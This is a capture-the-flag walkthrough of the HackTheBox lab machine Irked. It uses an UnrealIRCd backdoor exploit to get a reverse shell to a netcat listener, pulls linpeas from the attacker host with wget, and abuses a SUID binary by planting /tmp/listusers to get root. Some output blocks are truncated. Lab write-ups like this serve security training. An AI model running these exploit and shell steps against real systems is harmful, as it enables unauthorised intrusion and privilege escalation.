## Initial Thoughts Based On Nmap Scans

Based on the Nmap scans, I am going to just speak out my thoughts based on the ports I see from top to bottom. Starting with `22 - SSH`, this is usually a port I will deal with once I have gotten some sort of username or credentials to log into an account. I will also quickly look to see if this is an out of date version as this may lead to SSH being vulnerable to an exploit. More likely than not it will just be a vector in which we use once we gain credentials / a username so we can brute force the account. Next, with `80 - HTTP`, something to note about HTTP is that it is a beast on it's own. I just start off small by simply looking at the site, taking a look at the page source and see if there is anything interesting in there, do directory brute forcing to see if I can discover any new directories on the website, look to see if I can identify any version numbers in which I can Google for an exploit for that particular service and version number, etc. Next, `111 - rpcbind` which is a `Portmapper` which is just used to provide information between Unix based systems. You can usually go and probe this to fingerprint the OS and maybe obtain information about available services. This will most likely be the last port I look at as the exploit path is fairly niche in my experience so far. Next, we have a few ports (`6697, 8067, 36530, 65534)` for `IRC` which is an Internet Relay Chat. Essentially it is just a text-based chat system that can be hosted. For this, I will most likely just be Googling if there are any known exploits for this particular service "UnrealIRCd". With my thoughts being expressed, let's start this box!

## HTTP - 80 | Enumeration

Firstly I start by just navigating to the page by going to `http://10.10.10.117`. There is nothing really interesting here besides a picture. I go ahead and run a `gobuster` scan against the web application.

```
gobuster dir -u http://10.10.10.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Doing this did not really yield anything useful. Seeing that there is no directories being found, I tried to use some extensions for the `gobuster` scan as well and no luck.

```
gobuster dir -u http://10.10.10.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.pdf
```

I went ahead and checked the page source as well and nothing was here except for the path to the image which was simply `http://10.10.10.117/irked.jpg`. As there was not really much to go off of at this point, I went ahead and left this on the back burner for now.

## IRC - 6697/8067/36530/65534 | Enumeration

The first thing I did when seeing this was just do a simple `searchsploit` search which is a tool that simply archives the Exploit Database website for exploits. 

```
searchsploit UnrealIRC
```

```
root@kali~searchsploit UnrealIRC

---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I see one that mentions "Backdoor Command Execution". Sounds pretty intriguing if you ask me. As I am prepping for the OSCP exam and Metasploit is limited, I go ahead and Googled for this exploit and found [this](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor). I go ahead and clone it onto my box.

```
git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git
```

### Low Privilege Shell

Running the command I can see what arguments it needs for this exploit to run properly.

```
python3 exploit.py
```

```
root@kali-[/opt/UnrealIRCd-3.2.8.1-Backdoor]python3 exploit.py                                
usage: exploit.py [-h] -payload {python,netcat,bash} ip port
exploit.py: error: the following arguments are required: ip, port, -payload
```

So I need the IP address, the port number, and use `-payload` and specify what I want, either `python, netcat,` or `bash`. I'm going to use bash. Before I do anything else though I also need to change the `local_ip`  and `local_port` variables to my own IP and a port I will be listening on. I chose 443 as the port I will be listening on. 

```
vim exploit.py
```

```
# Sets the local ip and port (address and port to listen on)
local_ip = '10.10.14.36'  # CHANGE THIS
local_port = '443'  # CHANGE THIS 
```

I went ahead and saved the file. Now I can set up my Netcat listener on port 443.

```
nc -lvnp 443
```

With my Netcat listener set up, I can run the exploit:

```
python3 exploit.py 10.10.10.117 6697 -payload bash
```

```
root@kali-[/opt/UnrealIRCd-3.2.8.1-Backdoor]python3 exploit.py 10.10.10.117 6697 -payload bash
Exploit sent successfully!
```

Looking back at my Netcat listener I got a connection!

```
root@kali-[~]nc -lvnp 443
listening on [any] 443 ...

```

### Privilege Escalation

Now that we have a low privileged shell, I am going to look for ways to escalate my privileges to root. Good thing to always run when you get a low privileged shell is to run `linPEAS` or `winPEAS` depending on what operating system you are on. For me, I am on a Unix based system so I will be running `linPEAS`. If you do not already have it, simply copy paste [this](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) into a file (using a text editor like vim, nano, etc.) on **your** host and name it `linpeas.sh`. After that, host a simple Python HTTP server by running this command (make sure you are running this command within the directory that has your `linpeas.sh` file in it:

```
python -m SimpleHTTPServer 80
```

Hosting a Python Simple HTTP server will let me grab the file from my host and get it onto the low privileged shell. To download `linpeas.sh` off of my host from the low privileged shell, I need to use some sort of command to download the file. Typically I would use `curl` which is used to transfer data from or to a server using protocols like HTTP, FTP, IMAP, you name it. This box however doesn't have `curl`. Thankfully, there is another tool which is `wget`.  `Wget` is a utility for non-interactive download of files from the Web. So I can use `Wget` to go and download the file from my host and put it onto this box. I'm going to go ahead and do that.

```
wget http://10.10.14.36/linpeas.sh
```

```
ircd@irked:~/Unreal3.2$ wget http://10.10.14.36/linpeas.sh
wget http://10.10.14.36/linpeas.sh

2021-06-07 19:09:37 (943 KB/s) - ‘linpeas.sh’ saved [341863/341863]

```

Now that it is saved onto the box with the low privileged shell, I have to make sure the file is executable by running `chmod +x`.

```
chmod +x linpeas.sh
```

Now run it.

```
./linpeas.sh
```

This will give a lot of output. Something that seemed interesting to me under the "Interesting Files" section was this "Unknown SUID binary" under the path `/usr/bin/viewuser`. SUID is short for Set User ID which is a type of permission that allows users to execute a file wit the permissions of a specified user, this being the root user. So as the user we are right now (ircd), we can run this file.

djmardov pts/0        2021-06-07 15:38 (10.10.14.36)                                                                                                                                  
sh: 1: /tmp/listusers: not found
```

And it's mentioning on the bottom something about `/tmp/listusers` was not found. Interesting. So it can't find the file under the `/tmp` directory and it is trying to run it. Something to remember is that this is running as the root user so anything it will run will be ran as root. So technically, all we need to do is create a `listusers` file, put it into the `/tmp` directory, and have some sort of content within the `listusers` file that will spawn a shell. This is really simple so let's do it. Firstly, I go ahead and use `cd` to change directories into `/tmp`

```
cd /tmp
```

Now I go back onto my host and create a file named `listusers` using a text editor like vim, nano, etc. Doesn't really matter as long as you can write into the file. I go ahead and put the following into the file:

```
#!/bin/bash

bash
```

The `#!/bin/bash` is known as a "shebang". This is used to essentially instruct this program to run from `/bin/bash`. Then all I put in there after is just `bash`. Typing `bash` into a terminal will just spawn a bash shell. So all this is doing is specifying we need to run from `/bin/bash` and then use the command `bash` to spawn a bash shell. Easy enough. Now I went ahead and saved the file and I start up another Python HTTP server. Again, I am using this so I can transfer the file from my host to the low privileged shell.

```
python -m SimpleHTTPServer 80
```

Now on the low privileged shell, I download the file from my host

```
wget http://10.10.14.36/listusers
```

```
ircd@irked:/tmp$ wget http://10.10.14.36/listusers

uid=0(root) gid=1001(ircd) groups=1001(ircd)
